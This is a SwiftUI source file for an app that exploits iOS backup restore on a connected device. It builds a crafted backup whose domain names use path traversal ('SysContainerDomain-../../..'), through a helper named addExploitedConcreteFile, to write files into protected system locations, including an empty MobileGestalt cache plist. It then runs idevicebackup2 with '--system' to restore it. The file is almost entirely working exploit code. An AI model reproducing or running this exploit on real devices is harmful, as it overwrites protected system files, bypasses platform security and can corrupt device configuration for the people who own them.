import SwiftUI

let logPipe = Pipe()

struct LogView: View {
    @State var log: String = ""
    @State var ran = false
    var body: some View {
        NavigationView {
            ScrollViewReader { proxy in
                ScrollView {
                    Text(log)
                        .font(.system(size: 12).monospaced())
                        .fixedSize(horizontal: false, vertical: false)
                        .textSelection(.enabled)
                    Spacer()
                        .id(0)
                }
                .onAppear {
                    guard !ran else { return }
                    ran = true
                    
                    logPipe.fileHandleForReading.readabilityHandler = { fileHandle in
                        let data = fileHandle.availableData
                        if !data.isEmpty, let logString = String(data: data, encoding: .utf8) {
                            log.append(logString)
                            proxy.scrollTo(0)
                        }
                    }
                    
                    DispatchQueue.global(qos: .background).async {
                        print("RUNNING TEST")
                        runTest()
                    }
                }
            }
        }
        .navigationTitle("Log output")
    }
    
    init() {
        setvbuf(stdout, nil, _IOLBF, 0) // make stdout line-buffered
        setvbuf(stderr, nil, _IONBF, 0) // make stderr unbuffered
        
        // create the pipe and redirect stdout and stderr
        dup2(logPipe.fileHandleForWriting.fileDescriptor, fileno(stdout))
        dup2(logPipe.fileHandleForWriting.fileDescriptor, fileno(stderr))
    }
    
    func runTest() {
        let deviceList = MobileDevice.deviceList()
        guard deviceList.count == 1 else {
            print("Invalid device count: \(deviceList.count)")
            return
        }
        
        // Save MobileGestalt
        let mobileGestaltPlist = Data()
        
        let documentsDirectory = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
        let folder = documentsDirectory.appendingPathComponent(deviceList.first!, conformingTo: .data)
        
        do {
            try? FileManager.default.removeItem(at: folder)
            try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: false)
            
            var backupFiles: [BackupFile] = [
                Directory(path: "", domain: "RootDomain"),
                Directory(path: "Library", domain: "RootDomain"),
                Directory(path: "Library/Preferences", domain: "RootDomain")
            ]
            addExploitedConcreteFile(list: &backupFiles, path: "/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/NOT.com.apple.MobileGestalt.plist", contents: mobileGestaltPlist)
            backupFiles.append(ConcreteFile(path: "", domain: "SysContainerDomain-../../../../../../../../crash_on_purpose", contents: Data(), owner: 501, group: 501))
            let mbdb = Backup(files: backupFiles)
            try mbdb.writeTo(directory: folder)
            
            // Restore now
             let restoreArgs = [
             "idevicebackup2",
             "-n", "restore", "--no-reboot", "--system",
             documentsDirectory.path(percentEncoded: false)
             ]
             print("Executing args: \(restoreArgs)")
             var argv = restoreArgs.map{ strdup($0) }
             let result = idevicebackup2_main(Int32(restoreArgs.count), &argv)
             print("idevicebackup2 exited with code \(result)")
             logPipe.fileHandleForReading.readabilityHandler = nil
        } catch {
            print(error.localizedDescription)
            return
        }
    }
    
    func addExploitedConcreteFile(list: inout [BackupFile], path: String, contents: Data, owner: Int32 = 0, group: Int32 = 0) {
        let url = URL(filePath: path)
        list.append(Directory(path: "", domain: "SysContainerDomain-../../../../../../../../var/.backup.i\(url.deletingLastPathComponent().path(percentEncoded: false))", owner: owner, group: group))
        list.append(ConcreteFile(path: "", domain: "SysContainerDomain-../../../../../../../../var/.backup.i\(url.path(percentEncoded: false))", contents: contents, owner: owner, group: group))
    }
}
